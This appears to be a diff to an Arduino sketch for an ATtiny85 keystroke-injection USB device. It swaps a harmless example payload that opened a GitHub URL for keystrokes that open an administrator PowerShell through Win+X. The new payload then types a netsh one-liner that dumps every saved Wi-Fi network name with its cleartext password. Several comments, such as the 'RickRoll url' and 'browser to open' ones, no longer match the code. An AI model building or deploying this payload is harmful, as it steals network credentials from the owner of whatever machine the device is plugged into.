@@ -4,16 +4,7 @@
 
 DigiKeyboardMultilang keyboard(lang_de); // IMPORTANT Declare keyboard layout! e.g., lang_us for US English
 
-/*
-This code is automaticaly nested inside the main() function by the Arduino build system.
-
-Below, the user-defined setup() and loop() functions are defined.
-
-The default example payload here opens the Windows Run dialog and types a URL to open in the default browser.
-
-*/
-
-const char* runCmdPld = "https://github.com/3mrgnc3/attiny85_ducky"; // ScattRoll URL Example
+const char* runCmdPld = "netsh wlan show profiles|sls 'All.*P\\w*\\s*:\\s*(.+)$'|%{$n=$_.Matches[0].Groups[1].Value.Trim();$p=(netsh wlan show profile name=\"$n\" key=clear|sls 'K\\w*\\s*C\\w*\\s*:\\s*(.+)$').Matches[0].Groups[1].Value.Trim();\"${n}:$p\"} 2>$null|sort -Unique"; // dump wifi creds in PowerShell terminal example
 
 int redLED = 1;
 
@@ -23,9 +14,15 @@ void setup() {
     
     // --- THE HID INJECTION STARTS HERE ---
     keyboard.delay(6000); // Wait 6 seconds to allow the OS to recognize the device and install drivers if needed
-    keyboard.sendKeyStroke(KEY_R, KEY_E); // Win+R (0x08 = Left GUI/Windows key modifier)
+    keyboard.sendKeyStroke(KEY_X, 0x08); // Win+x (0x08 = Left GUI/Windows key modifier)
     keyboard.delay(800); // Wait 0.8 seconds for the run dialog to open
-    keyboard.println(runCmdPld); // Opens the Project Github URL using the run dialog
+    keyboard.println("a"); // Open a RickRoll url in the run dialog
+    keyboard.delay(800); // Wait 0.8 seconds for the browser to open
+    keyboard.sendKeyStroke(KEY_LEFT); // Move to beginning of line
+    keyboard.delay(300); // Wait 0.3 seconds for the browser to open
+    keyboard.sendKeyStroke(KEY_ENTER); // Execute command
+    keyboard.delay(2000); // Wait 2 seconds for the browser to open
+    keyboard.println(runCmdPld); // dump wifi creds in PowerShell terminal example
     // --- THE HID INJECTION ENDS HERE ---
     
     digitalWrite(redLED, LOW); // Turn off the RED LED after executing payload
